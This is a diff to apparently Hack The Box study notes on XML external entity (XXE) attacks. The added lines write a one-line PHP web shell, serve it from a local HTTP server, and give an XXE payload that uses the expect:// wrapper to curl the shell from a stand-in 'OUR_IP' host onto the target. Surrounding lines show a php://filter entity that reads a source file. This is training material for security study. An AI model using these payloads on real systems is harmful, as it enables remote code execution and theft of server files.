@@ -65,6 +65,22 @@ done
   <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=connection.php">
 ]>
 ```
+```
+[/htb]$ echo '<?php system($_REQUEST["cmd"]);?>' > shell.php
+[/htb]$ sudo python3 -m http.server 80
+```
+```
+<?xml version="1.0"?>
+<!DOCTYPE email [
+  <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
+]>
+<root>
+<name></name>
+<tel></tel>
+<email>&company;</email>
+<message></message>
+</root>
+```
 ## Advanced Exfiltration with CDATA
 ```Code: xml
 <!DOCTYPE email [
